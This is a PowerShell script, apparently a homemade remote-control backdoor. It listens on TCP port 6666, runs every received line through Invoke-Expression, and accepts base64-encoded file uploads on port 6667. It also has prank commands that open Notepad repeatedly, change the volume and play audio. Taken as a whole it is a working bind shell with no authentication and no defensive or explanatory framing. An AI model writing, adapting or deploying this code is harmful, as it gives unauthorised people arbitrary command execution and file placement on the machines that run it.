function set_volume($split_message) {
    if($split_message.Length -eq 1) { return "Insira o valor do volume" }
    
    $volume = [int] ($split_message[1]/2)
    $wshShell = new-object -com wscript.shell
    1..50 | % { $wshShell.SendKeys([char]174) }
    1..$volume | % { $wshShell.SendKeys([char]175) }
    return "Ok"
}
function play_music($split_message) {
    if(($split_message.Length -eq 1) -OR (!($split_message[1] -like "*\*"))) { return "Put complete file dir"}
	Add-Type -AssemblyName PresentationCore
    $mediaPlayer = New-Object System.Windows.Media.MediaPlayer

    Try {
        $mediaPlayer.Open($split_message[1])
        Start-Sleep -s 2 #Wait for loading file
        $duration = $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds

        $mediaPlayer.Volume = 100
        $mediaPlayer.Play()
        Start-Sleep $duration
        return "Ok"
    }
    Catch { return "File not found" }
}
function test_notepad() {
    $texto = 'Testando notepad !!!'
    $texto | Set-Content 'file.txt'
    for($i=0; $i -lt 10; $i++) { Start notepad 'file.txt' -WindowStyle Maximized }
    return "Ok"
}
function ConvertFrom-Base64($string) {
    $decoded = [System.Convert]::FromBase64String($string)
    $decoded = [System.Text.Encoding]::Default.GetString($decoded)
    $decoded = [System.Text.Encoding]::Default.GetBytes($decoded)
    return $decoded
}
function receive_file($current_dir, $port_file, $split_message) {
    $response = "Error"
    
    if(!($split_message.Length -eq 3))       { return $response }
    if(!($split_message[1] -like "*\*"))     { return $response }
    if(!($split_message[2] -like "*\*"))     { $split_message[2] = $current_dir + "\" + $split_message[2] }
    
    Try {
        $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, $port_file)
        $listener = New-Object System.Net.Sockets.TcpListener $endpoint
        $listener.start()

        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream();
        $reader = New-Object System.IO.StreamReader $stream

        $base64content = $reader.ReadToEnd()
        if(!$base64content) { return "Arquivo Sem Conteudo" }

        [Byte[]] $decoded_content = ConvertFrom-Base64($base64content)
        Set-content -encoding byte $split_message[2] -value $decoded_content

        $reader.dispose()
        $stream.dispose()
        $client.close()
        $listener.stop()
        
        return "Ok"
    }
    Catch {
	    Write-Host $Error[0]
	    return "Erro de Envio"
    }
}
function clean_socket($socket, $stream) {
    if($stream -ne $null) { $stream.Close() }
    if($socket -ne $null) {
        $socket.stop()
        Start-Sleep -s 1
    }
}
function new_socket($port) {
    $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, $port)
    $socket = New-Object System.Net.Sockets.TcpListener $endpoint
    $socket.start()
    $connection = $socket.AcceptTcpClient()
    $stream = $connection.GetStream()

    $reader = New-Object System.IO.StreamReader $stream
    $writer = New-Object System.IO.StreamWriter $stream
    $writer.AutoFlush = $true

    Return $reader, $writer, $stream, $socket
}
function main() {
    $port = 6666
    $port_file = 6667
    $current_dir = "$($pwd)"

    $received = ""
    $split_command = ""
    $separator = "sepsep"

    while ($true) {
        $new_socket_params = new_socket $port
        $reader = $new_socket_params[0]
        $writer = $new_socket_params[1]
        $stream = $new_socket_params[2]
        $socket = $new_socket_params[3]

        while($true) {
            Try {
                $received = $reader.ReadLine()
                $split_command = $received -split " "
            	
                if($split_command[0] -eq "testnotepad")      { $received = test_notepad }
                elseif($split_command[0] -eq "setvolume") { $received = set_volume $split_command }
                elseif($split_command[0] -eq "playmusic") { $received = play_music $split_command }
                elseif($split_command[0] -eq "send")      { $received = receive_file $current_dir $port_file $split_command }
                else {
                    Try {
                        iex $received
                        if($split_command[0] -eq "cd") { $current_dir = "$($pwd)" }
                        $received = "Ok"
                    }
                    Catch { $received = "Error PC1" }
                }
                $received = $received + $separator + $current_dir + "\> ";
                $writer.WriteLine($received)
            }
            Catch {
                clean_socket $socket $stream
                break
            }
        }
    }
}
main